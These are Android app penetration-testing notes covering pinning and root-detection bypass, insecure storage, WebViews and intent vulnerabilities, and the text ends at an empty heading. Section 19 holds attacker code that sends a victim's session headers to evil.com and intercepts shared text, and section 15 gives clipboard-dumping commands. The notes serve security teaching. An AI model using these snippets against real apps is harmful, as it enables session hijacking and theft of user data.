## 1.CERTIFICATE/SSL Pinning

##### What is network_security_config.xml
`network_security_config.xml` is an optional XML file (introduced in **Android 7.0, API 24**) that allows apps to **customize their network security policies** without changing code. It is referenced in the `AndroidManifest.xml` under the `<application>` tag.

##### Key Capabilities

- **Custom trust anchors** → trust specific Certificate Authorities (CAs), like a self-signed cert or internal CA.
- **Debug-only overrides** → allow extra trusted certs for dev/debug builds only.
- **Cleartext traffic control** → enable/disable unencrypted HTTP traffic (disabled by default in API 28+).
- **Certificate transparency opt-in** → enforce that certs must appear in public CT logs (API 36+).
- **Certificate pinning** → restrict which server certs/public keys the app will accept.
##### How to Bypass Network Security Config Requirements 
-  Repackage the app by adding network_security_config.xml
-  Frida Method Hooking

#### What is SSL pinning
SSL pinning is a technique that helps to prevent MITM attacks by hardcoding the SSL/TLS certificate’s public key into the app or device. This means that when the app or device communicates with the server, it will compare the server’s SSL/TLS certificate’s public key with the one that is hardcoded into the app or device.

##### Techniques Used in SSL Pinning

1. **Certificate Pinning** – The app hardcodes the server’s SSL certificate and only trusts connections that match it. This is simpler to implement but requires app updates whenever the server’s certificate changes.
    
2. **Public Key Pinning** – Instead of the full certificate, the app pins the server’s public key. This allows the certificate to change as long as the key stays the same, offering more flexibility but requiring more technical setup.
##### Types of SSL Pinning
1. Static SSL Pinning
	In static SSL pinning, the certificate or public key is hardcoded in the application. This means the application will only trust the specific certificate or public key pre-defined in the code.
1. Dynamic SSL Pinning
	In dynamic SSL pinning, the application does not hardcode the certificate or public key. Instead, it retrieves the certificate or public key from the server during the initial handshake and then caches it locally for future connections.
#####  Where pinning happens in Android
- **`network_security_config.xml`** → XML rules (easy to read/bypass with Frida/Xposed).
- **Custom TrustManager / HostnameVerifier** → devs write their own cert-checking logic.
- **Libraries** → like OkHttp, TrustKit, Retrofit can add pinning internally.
- **Native code** → Some apps do pinning in C/C++ (OpenSSL, BoringSSL) to make bypass harder.
##### Bypassing Techniques
- [APK patching](https://medium.com/@osamaavvan/android-ssl-pinning-bypass-part-1-ddd8e93bbd5d)
- Frida Method Hooking
- Using Objection
- TrustManager Hijacking
- Dex Modification
 - [More](https://krushnalipane.medium.com/bypassing-android-ssl-pinning-194e41a0d807)


## 2. Root Detection

##### What is Rooting
Android rooting is a technique that allows one to easily gain unrestricted access to the system files. Access here means – being able to change, delete, or modify things as needed. In IOS, this is equivalent to JAIL Breaking. It gives the ability to modify the device’s software code or install other software that the manufacturer would not normally allow for good mobile security reasons. Rooting can provide significant advantages over a standard Android device, but gaining access to sensitive files can cause a variety of issues for both the user and the Android device.

##### What is Android Root Detection Bypass?
When creating an application, developers include a root detection mechanism to prevent users from using it on a rooted Android device. When a user attempts to install an application, it generates an error message and refuses to allow the application to be installed on a rooted device. During the root bypass, we make changes to the code that prevent the application from closing, resulting in the running of the application on a rooted Android device. So, to accomplish this, we will first install Frida and then bypass the root detection.

###### Root Detection Techniques
Apps usually check for signs of rooting, such as:
1. **SU binary check** – Looking for the `su` executable, which grants superuser access.
2. **Superuser apps** – Detecting apps like _SuperSU_, _Magisk Manager_, or _KingRoot_.
3. **System property checks** – Examining system properties (`ro.debuggable`, `ro.secure`, etc.) that may be altered on rooted devices.
4. **Dangerous paths** – Checking if system directories (`/system/xbin/su`, `/system/app/Superuser.apk`, etc.) exist.
5. **File system changes** – Verifying if `/system` is mounted as writable.
6. **SELinux status** – Detecting if Android’s security policy enforcement (SELinux) is disabled or set to permissive mode.
7. **SafetyNet / Play Integrity API** – Google’s service that checks device integrity and returns pass/fail results.

##### Bypassing Root Detection
- Patching the APK
- Firda Method Hooking ( fridantiroot.js)
- Magisk Hide and Zygisk denylist (if the device is rooted)
- rootcloaking
- [More](https://valuementor.com/blogs/my-fav-7-methods-for-bypassing-android-root-detection)
- [More](https://medium.com/secarmalabs/comparison-of-different-android-root-detection-bypass-tools-8fd477251640)
- [Andropass](https://github.com/hojjatsajjadinia/AndRoPass)
-

## 3. Emulator Detection
##### What is an Emulator?
An emulator is a software tool that mimics the hardware and software environment of a specific device, allowing applications to run as if on the original system.

##### Android Emulator Detection Techniques

Android emulator detection relies on analyzing characteristics that differentiate virtual environments from physical devices. Since no single check is foolproof, apps often combine multiple methods to increase detection reliability.

###### 1. System Properties Analysis
- Emulators frequently expose **distinct `Build` and system property values** that differ from real devices.
- Typical checks include:
    - `android.os.Build` → `MODEL`, `MANUFACTURER`, `BRAND`, `PRODUCT`, `DEVICE`, `HARDWARE`.
        - Examples: `"sdk"`, `"google_sdk"`, `"generic"`, `"goldfish"`, `"ranchu"`.
    - `ro.kernel.qemu = 1` → set when running under QEMU
- Inconsistencies between properties (e.g., manufacturer vs. hardware string) are also a giveaway.
###### 2. Hardware & Sensor Checks

- Emulators lack many **physical components** or provide fake substitutes.
- Detection strategies include:
    - Checking `TelephonyManager` for **IMEI**, **SIM serial number**, or **subscriber ID** (often missing or invalid).
    - Verifying **sensor availability**: accelerometer, gyroscope, magnetometer, proximity sensor.
    - Detecting **non-realistic sensor data** (e.g., constant zero values).
###### 3. Network Analysis

- Emulator networking often shows predictable patterns:
    - Default **IP address** range: `10.0.2.x`.
    - Emulator DNS: `10.0.2.3`.
    - Common **Wi-Fi SSID**: `"AndroidWifi"`.
    - **MAC addresses** may use known prefixes or invalid formats.
    - Unusual **TTL (Time-To-Live)** values compared to typical mobile carriers.
###### 4. File System & Runtime Checks
- Specific files and directories can reveal an emulator:
    - `/dev/qemu_pipe`
    - `/dev/socket/qemud`
    - Emulator-specific drivers (goldfish, ranchu) in `/proc/` entries.
- Pre-installed emulator packages (`com.bluestacks`, `com.genymotion`, etc.) are another signal.
###### 5. Native Bridge & Library Detection

- Some emulators use **native bridge technologies** to translate ARM code to x86.
- Detection methods:
    - Checking loaded libraries (`/system/lib` vs `/system/lib64`).
    - Looking for abnormal CPU ABI strings.
    - Inspecting system properties that reveal translation layers.

###### Bypassing Emulator Detection
- Patching the APK
- Frida method Hooking
- Rootcloaking

## 4.Insecure Logging
Insecure logging is a security vulnerability that occurs when applications write sensitive data, such as passwords, personal information, or API keys, into logs or device memoty that are stored in plain text and are accessible to other apps or attackers. This type of vulnerability leads to information disclosure, allowing malicious actors to access and exploit valuable credentials or PII. 

##### Static Analysis (code audit)

- Search code for log calls.
- Check **ProGuard rules** for stripping logs:
    ```
    -assumenosideeffects class android.util.Log {
  public static int v(...); 
  public static int d(...); 
  public static int i(...); 
  public static int w(...); 
  public static int e(...); 
  public static int wtf(...);
}
 
- Risk: String concatenation may still leave sensitive data in memory, even if log call is removed.
- Mitigation: Use **custom logger (SecureLog)** + configure ProGuard.
##### Dynamic Analysis (runtime testing)

- Use app features → check for log files in:  
    `/data/data/<package-name>/`
- Use **Logcat** to monitor logs:
```
adb logcat --pid=<PID>
adb logcat | grep <package-name> 
adb logcat --regex="password|token|credit
```


##### 4.1 Sensitive information in ADB Logcat
Logcat is a command-line tool within the Android Debug Bridge (ADB) that allows developers to view and analyze log messages generated by the Android system and applications running on an Android device or emulator. It provides a real-time stream of system and application logs, which are essential for debugging, performance monitoring, and understanding the behavior of an app. 

##### Tools
- MobSF 
- **QARK (Quick Android Review Kit)**
- AndroBugs Framework
- **Drozer**
- **SonarQube**
- **ADB Logcat (with regex filters)**

## 5.Insecure Data Storage
Insecure data storage in Android applications is the practice of storing sensitive user information, such as credentials, personal details, or payment information, without adequate encryption or other security measure. This practice is dangerous because it allows malicious applications, or even attackers, to easily access and exploit this data if they gain unauthorized access to the device's file system, often through rooting, jailbreaking, or by exploiting insecure permissions.

##### Common insecure storage locations

Apps may store data insecurely in:

1. **SharedPreferences**
    - XML files inside `/data/data/<package>/shared_prefs/`
    - Often used for saving login tokens, session IDs, passwords (bad practice).
2. **SQLite Databases**
    - Stored in `/data/data/<package>/databases/`
    - Can contain PII, credentials, credit card details.
3. **Internal Storage (files)**
    - `/data/data/<package>/files/` or `/cache/`
    - Apps may save unencrypted sensitive files (images, reports, logs).
4. **External Storage (SD card / shared storage)**
    - `/sdcard/Android/data/<package>/`
    - Accessible by any other app with storage permission.
5. **Logs (Logcat)**
    - Developers sometimes log credentials, tokens, or API keys.
6. **Backup files**
    - If app data is included in Android backups without encryption.

##### 5.1Shared Preference:
**SharedPreferences** is a lightweight storage mechanism that allows apps to save small amounts of data in the form of key–value pairs, such as a username, a login status, or user settings like theme preferences. This data is stored in an **XML file** inside the app’s private directory (`/data/data/<package_name>/shared_prefs/`), which means it is persistent across app restarts

##### 5.2Temporary Files
Temporary files in Android are short-lived files created by applications or the operating system to handle tasks like caching, buffering, downloads, or processing user input. They are not meant for permanent storage but can still contain sensitive information such as usernames, passwords, tokens, or session data. These files are usually stored in app-specific cache directories like
- `/data/data/<package_name>/cache/` (internal storage) 
- `/sdcard/Android/data/<package_name>/cache/` (external storage), 
- `/data/local/tmp/`
- `/cache/`
 The main risk is that temporary files are often unencrypted and may not be properly deleted, leaving sensitive data exposed for attackers with device access. In penetration testing, checking these locations helps identify insecure data storage practices.

##### 5.3 SD Card
- - `/sdcard/`
- `/storage/emulated/0/`
- It is **shared storage**, meaning multiple apps and the user can access it.
- Data here is **not private** to an app. Any app with the right permission can read/write it.

- Storage APIs apps use:
    
    - `getExternalStorageDirectory()` → root of external storage
    - `getExternalFilesDir()` → app-specific directory (e.g., `/sdcard/Android/data/<package_name>/files/`).
    - `FileOutputStream` or standard file I/O → to create and write files.
- Data Types Commonly Stored
    - Media files (photos, videos, audio)
    - Cached files (downloads, temporary data)
    - Exported data (logs, reports, backups)

Permissions in Androidmanifest.xml
```
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
```


## 6.Sensitive data in Application Memory
A sensitive data in application memory vulnerability in an Android app occurs when the app stores sensitive data, such as passwords or personal information, in memory in an unencrypted or unsecured manner, potentially exposing the data to attackers or unauthorized users who have access to the device's memory.

###### Techniques Used
- [Objection](https://medium.com/@softMonkeys/memory-forensics-dumping-android-application-memory-1f3f092298e3)
- [Frida Fridump.py](https://medium.com/@softMonkeys/memory-forensics-dum)
- [Check Memory Maps](https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/)

## 7. Weak Signing Algorithm
When developers release an Android app (APK file), they **sign it with a digital signature**.

- This signature proves the app really came from the developer.
- It also ensures the APK hasn’t been changed after signing
When you install an APK, Android checks the signature to verify authenticity and integrity.

A signature algorithm is used to sign an Application Package (APK) to verify its authenticity and integrity. If a weak signature algorithm is used, attackers can potentially tamper with the APK file and modify its behavior, such as stealing sensitive information.

##### Enumerating Signing Algorithm used by APK
```
# 1. Using apksigner (Android SDK Build Tools)
apksigner verify --print-certs myapp.apk

# 2. Using keytool (Java JDK)
keytool -printcert -jarfile myapp.apk

# 3. Using unzip + openssl (manual inspection)
unzip -p myapp.apk META-INF/*.RSA > CERT.RSA
openssl pkcs7 -inform DER -in CERT.RSA -print_certs -text -noout

# 4. Using apksigcopier (community Python tool – shows v1/v2/v3/v4)
pip install apksigcopier
apksigcopier --verify myapp.apk
```


## 8. Code Obfuscation
Code obfuscation is a technique that makes it difficult for attackers to reverse engineer an application’s code. This can help protect sensitive information and prevent attackers from identifying vulnerabilities in code. Developers should use code obfuscation techniques, such as renaming classes, methods, and variables, to make it difficult for attackers to reverse engineer their code.

##### 8.1 Static Analysis
This means analyzing the APK **without running it**.
1. **Decompile the APK** (using tools like `jadx`, `apktool`, `dex2jar`).
2. **Review the Decompiled Code** for signs of obfuscation.
##### 8.2 Dynamic Analysis
This means analyzing the APK **while it’s running**.
- **APKiD** → tool to fingerprint APKs and detect obfuscation, packers, anti-debug measures.

##### Techniques:
- code de obfscuation
	- **deguard** → tries to recover class/method names by analyzing usage.
	- **simplify** → simplifies obfuscated DEX bytecode.
	- **Procyon / CFR / JADX** → some decompilers do a decent job even on obfuscated code.
	- **Bytecode viewer** → allows switching decompilers for better readability.
- Frida and objection method  hooking
1. **Dynamic memory dump** (after unpacking in RAM):
    - Run the app on a rooted device/emulator.
    - Use tools like:
        - `frida-dexdump` → dumps all DEX files from memory.
        - `dumpdex` / `dexplorer` → similar idea.
    - This gets you the _real decrypted DEX_.
2. **Hooking loaders**:
    - Use Frida/Xposed to hook the decryption functions inside the loader.
    - Capture strings, decrypted code, or unpacked DEX in real time.
3. **Bypass anti-debug/anti-root**:
    - Packers often add checks (`Build.TAGS`, `su` binary detection).
    - Tools like `Magisk`, `Frida gadget`, or Xposed modules can help bypass them.


## 9. Hardcoded Credentials
Sensitive information such as API keys, passwords and authentication tokens should not be hard-coded into application code. Attackers can gain access to this information by decompiling the APK file. Developers should ensure that sensitive information is stored securely and not hard-coded in application code. Instead, sensitive information should be stored in a secure location, such as secure device storage or a remote server.

##### Tools
- Apkleaks

## 10. Integrity Checks
Integrity checks in Android refer to the process of verifying the authenticity or integrity of an app's source code, to ensure that it has not been tampered with or modified by an unauthorized party. This can help protect against attacks that aim to inject malicious code or modify the app's functionality, such as man-in-the-middle attacks or repackaging attacks.
###### Techniques
Decompile the application, modify its code, recompile it, and sign it to check if it still functions properly or not.

## 11. Background Screen Caching
In Android, when you switch between apps (e.g., pressing the home button or multitasking button), the **system takes a snapshot (screenshot) of the current app’s screen** to show a preview in the “Recent Apps” view.

- This screenshot is cached in memory.
- If the app is showing **sensitive information** (passwords, OTPs, banking details, medical info, etc.), that information may be visible in the cached screenshot.

This is what we call the **Screen Caching Vulnerability**.
**Why it happens:**
- By default, Android takes a snapshot of the current app to show it in the **Recent Apps view**.
- If the developer does **not** set the `FLAG_SECURE` flag, these screenshots can be accessed by:
    - Anyone opening the Recent Apps view.
    - Malicious apps with screenshot permissions or root access.
    - Screen recording apps.
Two important things happen:
1. **No Screenshots**
    - The user cannot take screenshots (or screen recordings) of that activity.
    - If you try, you’ll see a black screen or a “Can’t take screenshot due to security policy” message.
2. No Screen Caching in Recents
    - Android won’t capture a preview of the app for the “Recent Apps” list.
    - Instead, it will just show a blank/black thumbnail.

##### Snapshot Storage Location
```
/data/system_ce/<USER_ID>/snapshots/
/data/system_ce/<USER_ID>/recent_images/
```

##### Bypassing FLAG SECURE
- Frida Hooking
- Patch APK
- Xposed modules

## 12. Backup Misconfiguration
Backup misconfiguration occurs when an app allows backups (`android:allowBackup="true"`) in its manifest, which is the default setting if not specified. This lets attackers create a backup of the app’s private directory (`/data/data/<package>`) using `adb backup` without needing root. The backup file (`.ab`) can then be converted into a `.tar` archive with tools like **Android Backup Extractor (ABE)** and extracted to reveal sensitive files such as `shared_prefs.xml` (storing tokens, passwords, or API keys), SQLite databases, or other internal files. This can expose authentication secrets or user data. To prevent this, developers should explicitly set `android:allowBackup="false"` in the manifest and ensure sensitive data is encrypted (e.g., using SQLCipher) instead of stored in plaintext.

## 13. Taskbar Snooping
**Taskbar Snooping** in Android refers to a privacy issue where an application monitors or collects information about a user’s **recent app usage or task history** (apps shown in the recent apps/taskbar view). By accessing system APIs such as `getRunningTasks()`, `getRecentTasks()`, or `UsageStatsManager`, a malicious app can determine which apps the user opened and when. This can lead to **privacy leaks, profiling, or surveillance**, especially if sensitive apps like banking, messaging, or healthcare apps are tracked without user consent.

##### Steps to Test for Taskbar Snooping

###### 1. Static Analysis

- **Decompile the APK** (`apktool d app.apk`) and review the `AndroidManifest.xml`.
- Look for suspicious permissions:
    - `android.permission.PACKAGE_USAGE_STATS` (usage history access).
    - `android.permission.GET_TASKS` (deprecated but still seen in older apps).
    - `android.permission.REAL_GET_TASKS` (system apps).
- In the **decompiled Java/Smali code**, search for API calls like:
    - `getRunningTasks()`
    - `getRecentTasks()`
    - `UsageStatsManager.queryUsageStats()`
###### 2. Dynamic Analysis

- **Run the app** on a test device or emulator.
- Grant/deny usage access when prompted.
- Monitor runtime behavior with:
```
adb logcat | grep -i usage
adb logcat | grep -i task
```


## 14. Third-party keyboards allowed
A **third-party keyboard** is any other keyboard you install yourself (SwiftKey, Fleksy, custom IME, etc.).

Third-party keyboards can potentially access user input and sensitive information such as login credentials or credit card numbers. If the app allows third-party keyboards, attackers can potentially use them to capture this sensitive information. Developers should make sure their app doesn’t allow third-party keyboards, or use them only when necessary with proper permission and safeguards
[more](https://maheshikapiumi.medium.com/allowance-of-third-party-keyboards-in-android-fbb3e6175378)

## 15. Clipboard Data Leakage
In Android, the clipboard is a temporary memory area where text, links, or images are stored when you copy or cut them, allowing you to paste them elsewhere within or across app. This data isn't permanent; it typically holds the most recent item and is cleared over time or after a device restart.

##### 15.1 How Clipboard Works

- Android provides a system service called **ClipboardManager**.
- Apps use this API to:
    - Put data into the clipboard (copy).
    - Get data from the clipboard (paste).

Types of Data in Clipboard:

- **Simple text** → stored directly.
- **Images, files, binary data** → stored as a **reference (URI)**, resolved via a content provider.
  Because it’s a shared space, **any app can potentially access it**.

##### 15.2 Clipboard Storage Location

- Clipboard data is stored **temporarily in system memory** inside the **system_server process**.
- Apps can request clipboard data through IPC (Binder calls to the system service). `/data/system/clipboard.db`.

```
adb shell am clipboard get
```
- Prints current clipboard contents on screen

###### 15.3 Pasteboard Hijacking
```
# 1. List all running processes to find target app
adb shell ps | grep <app_package_name>

# Example:
adb shell ps | grep insecure

# Output may look like:
# u0_a67   12345  ... com.android.insecurebankv2
# Here --> User ID = u0_a67 , PID = 12345

# 2. Dump clipboard content for that app using service call
adb shell su u0_a67 service call clipboard 2 s16 com.android.insecurebankv2

# 3. Alternative (generic) way to check clipboard content (works on some Android versions)
adb shell am clipboard get

# 4. If you want to check keyboard cache (user dictionary)
adb shell
cd /data/data/com.android.providers.userdictionary/databases/
sqlite3 user_dict.db "SELECT * FROM words;"

```
[more](https://redfoxsec.com/blog/protecting-android-clipboard-content/)

## 16. Insecure Deeplinks
[read](https://medium.com/mobis3c/deep-link-exploitation-introduction-open-unvalidated-redirection-b8344f00b17b)

## 17. insecure Exported Components
In Android, an **exported component** is an app component (Activity, Service, Broadcast Receiver, or Content Provider) that is made accessible to other applications outside of its own package. This is controlled by the `android:exported` attribute in the app’s **AndroidManifest.xml** file. If a component is set as `android:exported="true"` (or implicitly exported through intent filters in older Android versions), any other app can interact with it, unless additional permissions are enforced. Exported components can be useful for legitimate inter-app communication but are dangerous if not properly secured, since attackers can exploit them to bypass authentication, send malicious data, or access sensitive information.

##### Which Android Components are affected?

Export can apply to **all 4 major Android components**:
1. **Activities**
    - If exported → other apps can launch your screens directly.
    - Risk: attackers bypass login or jump into privileged parts of the app.
2. **Service**
    - If exported → other apps can bind to or start the service.
    - Risk: malicious commands, privilege escalation.
3. **Broadcast Receivers**
    - If exported → attackers can send fake broadcasts.
    - Risk: trigger unintended actions like sending SMS, wiping data, etc.
4. **Content Providers**
    - If exported → other apps can query/modify your app’s database.
    - Risk: SQL injection, unauthorized data leakage.


## 18. Insecure Webview
WebView in Android is a UI component that allows Android applications to display web content directly within the app's layout, without launching a separate web browser. It is essentially an embedded browser engine that can render HTML, CSS, and execute JavaScript. Webviews are vuln to all web appication vulnerabilities

An insecure WebView refers to a WebView in an Android app that does not have proper security measures in place, leaving it vulnerable to various security risks.

##### 18.1 Native Bridges
A **native bridge** in Android WebView is a feature that allows JavaScript inside a webpage to communicate with the app’s Java code. This is usually done with methods like `addJavascriptInterface()` or through message channels such as `postWebMessage()`. Developers use this when they want web content to trigger native app functionality.

The vulnerability comes from how `addJavascriptInterface()` works. When a developer exposes a Java object through this method, it becomes available to **all frames** in the WebView, including iframes. If the WebView loads untrusted content, such as an external website or an injected frame, any malicious JavaScript running there can call the exposed Java methods. In other words, the app gives web content a direct door into its internal code.

For example, if an app exposes a method like `getDeviceID()` using `addJavascriptInterface()`, a malicious script in the WebView could simply call `Android.getDeviceID()` to steal sensitive information. Similarly, if developers use `postWebMessage()` but don’t validate where the message is coming from, a malicious page can send fake messages that trick the app into executing unintended actions. These flaws make it possible to perform XSS inside the WebView, redirect users to phishing pages, or even run Java code with the app’s permissions.

- `javascript://` → XSS & bridge abuse.
- `file://` → Local File Inclusion (LFI).
- `http(s)://` → malicious remote pages (phishing, JS injection).
- `content://` → potential local data exposure.

##### 18.2 Unsafe File inclusion

WebView allows Android apps to render web content, but insecure configurations in **WebSettings** can expose the app to **file inclusion vulnerabilities**. These issues typically appear when developers enable access to `file://` URIs and allow JavaScript execution at the same time. Risky settings include:

- `setAllowFileAccess()` → allows loading local files.
- `setAllowFileAccessFromFileURLs()` → lets local files load other local files.
- `setAllowUniversalAccessFromFileURLs()` → gives local files unrestricted network access.
- `setJavaScriptEnabled()` → enables JavaScript execution inside WebView.

Additionally, `WebChromeClient.onShowFileChooser()` lets users select files inside a WebView, but it does not enforce restrictions on which files can be chosen. This can be abused to expose or upload sensitive data.
##### Why it’s risky

- If **JavaScript is enabled** and combined with file access, malicious scripts can execute inside the WebView, leading to **file-based XSS**.
- If **file:// access** is enabled, attackers may directly load sensitive app files, such as:
    `file:///data/data/com.example.app/shared_prefs/app_prefs.xml`
- If the **file chooser** is exposed, an attacker could trick the app into selecting untrusted or sensitive files since WebView does not validate the source
##### Impact
The severity depends on which WebSettings are enabled, but risks include:
- Theft of **local files** from `/data/data/` or external storage.
- Exposure of **sensitive user data** or **PII (Personally Identifiable Information)**.
- **File-based XSS** that executes JavaScript inside the WebView or device.
- Abuse of **file chooser** to gain access to private files without user awareness.

## 19. Insecure Intents

##### 19.1 Intent Redirection
In Android, **Intents** are used to launch components (Activities, Services, Broadcast Receivers). Some apps use a **ProxyActivity** (or similar components) as a shortcut: it takes another Intent as input and forwards it internally. For example:

```java
// ProxyActivity.java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```

At first glance, this seems harmless. But if the ProxyActivity is **exported (public)** in the `AndroidManifest.xml`, any other app can call it. This opens a vulnerability: an attacker can trick the Proxy into launching **non-exported components** that normally cannot be accessed by outsiders.
##### Example Vulnerability
Suppose the target app defines:

```xml
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```

`AuthWebViewActivity` loads a URL passed via Intent:

```java
// AuthWebViewActivity.java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```

Normally, the attacker cannot start `AuthWebViewActivity` directly:

```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent); 
// ❌ SecurityException: not exported
```

But because ProxyActivity is exported, the attacker can **wrap** the malicious intent and send it through ProxyActivity:

```java
// MaliciousApp.java
Intent hidden = new Intent();
hidden.setClassName("com.victim", "com.victim.AuthWebViewActivity");
hidden.putExtra("url", "http://evil.com/");

Intent attack = new Intent();
attack.setClassName("com.victim", "com.victim.ProxyActivity");
attack.putExtra("extra_intent", hidden);

startActivity(attack); // ✅ Works! Proxy forwards it
```

Now, the victim’s `AuthWebViewActivity` loads `http://evil.com/` with the user’s session headers → leading to **cookie theft, account hijacking, or XSS attacks** inside the WebView.
##### Extended Attacks
This vulnerability doesn’t stop at Activities. If the app has **non-exported ContentProviders** with `grantUriPermissions="true"`, the attacker can abuse the proxy to gain **read/write access** to private files (like databases, cached images, or user documents). Example:
```java
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setData(Uri.parse("content://com.victim.provider/image/1"));
```

The attacker’s app could then query and steal this data.
##### Remote Exploits

In some cases, apps convert URLs into Intents using:

```java
startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME));
```
If the app loads untrusted content into a WebView, an attacker can simply trick the user into clicking a malicious link like:

```javascript
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com;end";
```

This means exploitation could happen **remotely** (through a malicious website, phishing email, or MitM attack), without installing any app.

##### 19.2 Intent Hijacking
In Android, apps use **intents** to send messages or data either to their own components or to other apps. If an app uses an **implicit intent**, it only specifies _what action_ it wants (like `ACTION_SEND` to share data) but does not specify _which app_ should handle it.
###### Explicit vs Implicit
###### Explicit Intent (Safe)

You say _“Send this to John at 123 Main Street”_.

```
Intent intent = new Intent();
intent.setClassName("com.myapp", "com.myapp.SecureActivity"); startActivity(intent);
```
Always goes to YOUR app’s `SecureActivity`.

###### Implicit Intent (Risky)

You say _“Send this to anyone who knows how to handle mail”_.
```
Intent intent = new Intent(Intent.ACTION_SEND); intent.setType("text/plain"); intent.putExtra(Intent.EXTRA_TEXT, "super_secret_token"); startActivity(intent);
```
``
Here `Intent.ACTION_SEND` literally means:   "I want to **send some data**. Please find any app on the phone that can send data."
That could be Gmail, WhatsApp, or… a malicious app pretending to be a “Share” app.

When this happens, the Android system looks for any app that can handle that intent. The problem arises when a malicious app registers itself with an `<intent-filter>` for that same action. This allows the attacker’s app to receive the data the victim is trying to send. For example, if a victim app shares sensitive text like a password using `ACTION_SEND`, an attacker’s app can declare in its manifest that it handles `ACTION_SEND` with type `text/plain`. When the victim calls `startActivity(intent)`, Android may hand the data to the attacker instead of the intended app. This is called **intent hijacking**, because the attacker silently intercepts data by hijacking the implicit intent. The issue exists only because the victim didn’t restrict the intent to a specific trusted app — if it had used an **explicit intent** (via `setPackage()` or `setComponent()`), the attacker wouldn’t be able to intercept it.

Manifest for attacker app:
```
<activity android:name=".EvilReceiver">  
<intent-filter>         
		<action android:name="android.intent.action.SEND"/>         <category android:name="android.intent.category.DEFAULT"/>         <data android:mimeType="text/plain"/>     
</intent-filter>
</activity>

```

Attacker’s code:
```
public class EvilReceiver extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        String stolenData = intent.getStringExtra(Intent.EXTRA_TEXT);
        Log.d("StolenData", stolenData);  // Attacker steals the victim’s text
    }
}
```

##### 19.3 Intercepting Implicit intent to load arbitrary URL
